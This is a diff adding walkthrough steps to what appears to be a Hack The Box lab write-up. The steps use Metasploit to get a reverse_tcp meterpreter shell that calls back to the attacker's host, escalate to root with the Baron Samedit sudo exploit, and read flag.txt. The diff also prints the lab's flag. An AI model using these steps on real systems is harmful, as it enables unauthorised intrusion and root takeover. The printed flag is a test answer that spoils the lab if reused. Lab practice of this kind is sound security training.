@@ -131,5 +131,22 @@ Find the existing exploit in MSF and use it to get a shell on the target. What i
 * run command `python3 -c 'import pty; pty.spawn("/bin/bash")'` to have TTY access
 * type `whoami` and check the username
 
+alternatively you can:
+* set the payload on the same exploit to be `linux/x64/meterpreter/reverse_tcp`
+* set the RHOSTS to be the one deployed by HTB
+* set the LHOST to be your ip or the vpn ip provided
+* once the meterpreter shell is running, use the `getuid` command
+
 The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.
 
+`HTB{5e55ion5_4r3_sw33t}`
+* run command `sudo -V` to check for the current sudo version, which should be `1.8.31`
+* run command `background` to create a session out of your current exploit
+* search for information about the sudo version, youll find the exploit name is baron samedit
+* run command `search baron` on msfconsole
+* use the exploit and run the `options` command
+* set the SESSION to the current backgrounded session
+* set the LHOST to be your ip or the vpn ip provided
+* make sure the payload is the same as in the session, in this case is `linux/x64/meterpreter/reverse_tcp`
+* run the exploit, then make sure you got the right exploit by typing `getuid`
+* go to root folder and run command `cat flag.txt`
